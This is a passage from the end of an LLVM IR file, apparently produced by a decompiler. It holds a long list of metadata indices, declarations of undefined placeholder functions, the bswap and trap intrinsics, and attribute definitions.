450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 689, 690, 691, 546, 604, 605, 606, 607, 610, 608, 609, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 36, 723, 39, 724, 725, 44, 726, 728, 729, 730, 43, 727, 37, 731, 732, 733, 734, 735, 736, 737, 42, 738, 739, 740, 41, 741, 742, 743, 40, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 45, 783 }
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16* @__decompiler_undefined_function_4() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #0

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #1

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #0

attributes #0 = { nounwind readnone }
attributes #1 = { noreturn nounwind }
